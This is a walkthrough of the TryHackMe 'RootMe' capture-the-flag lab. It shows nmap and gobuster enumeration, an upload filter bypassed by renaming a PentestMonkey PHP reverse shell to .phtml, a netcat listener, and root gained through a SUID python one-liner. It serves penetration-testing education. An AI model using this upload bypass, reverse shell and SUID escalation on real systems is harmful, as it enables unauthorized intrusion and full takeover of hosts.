# TryHackMe-RootMe-CTF-Walkthrough-Writeup

This Labs focuses on skills of Enumerating, Hidden Directory Busting, By-passing blacklisted extentions and Priv-Esc.
</br>
<b>Replace <IP<IP>> with IP address of your machine.</b> I used IP i was provided, your machine's IP would be different.
***
## Enumeration
```
nmap -sC -sV <IP>
```
<pre>
nmap -sC -sV 10.10.53.147
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-03 03:08 IST
Nmap scan report for 10.10.53.147
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.13 seconds

</pre>
  
  As we see from `nmap` scan 2 ports are active. Running services `HTTP` and `SSH`.</br>
As HTTP is running, i opened the IP in browser to open website running on it but found nothing interesting.</br>
## Gaining Access
I decided to do directory busting using `gobuster`.

```
gobuster dir -u "http://<IP>" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<pre>
gobuster dir -u "http://10.10.53.147" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.53.147
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/03 03:18:38 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.53.147/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.53.147/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.53.147/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.53.147/panel/]  
Progress: 24472 / 220561 (11.10%)                                                ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2022/04/03 03:25:07 Finished
===============================================================

</pre>

`/panel` was a interesting as we can upload files here(Open in Browser).</br>
```
http://<IP>/panel
```

I tried uploading `php reverse shell` from PentestMonkey (Download this file).
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</br>

but PHP files( file with ".php" extention) were not permitted.</br>
To <B>bypass</B> this we just have to <b>rename</b> the extention from `.php` to `.phtml`.

Before uploading, Change the IP in this file to your Tun0 IP.
To find your Tun0 IP use command 
```
ip addr | grep tun0 | grep inet
```
Copy your tun0 IP and paste in the file.
<pre>
$ip = '**.*.***.***';  // CHANGE THIS
</pre>

Now open listening port on port mention in $port in the reverse shell file. Remember to use the same port as mentioned in file. By default it is "1234". Use command:
```
nc -lvnp <PORT>
```
Now Upload this `.phtml` file.
Yes!!! We successfully uploaded our reverse shell. Now lets activate it by  visiting `/uploads` in browser as we also saw this directory in gobuster.
```
http://<IP>/uploads
```
Now, We can see our file here, Click on it.</br>
Check your terminal you found <b>remote shell access.</b>

</br>

I ran `ls -la` but did not found user flag. ".sudo_as_admin_successful" was troll file as it was empty.

 To find the `user.txt` i used the `find` command:
  ```
  find / -type f -name user.txt 2> /dev/null
  ```
  
 It is in `/var/www/user.txt`. Read it  using:
  ```
  cat /var/www/user.txt
  ```
  
## Priv-Esc
  
  As it was given we have to find the files with unusual SUID.
  Command was already given:
  ```
  find / -user root -perm /4000
  ```
  I found `/usr/bin/python`unusual in the result as it should not have this permissions. As the path to it is in `/bin`, i knew i have to visit `GTFOBins`.
  https://gtfobins.github.io/gtfobins/python/#suid
  
 As we have to exploit the SUIDs, Copy the command given in SUID section, but we do not need to use entire command, just copy
  ```
  python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  ```
  and we are <b>Root</b>.</br>
  Now read the Root Flag by using:
  ```
  cat /root/root.txt
  ```
  
  
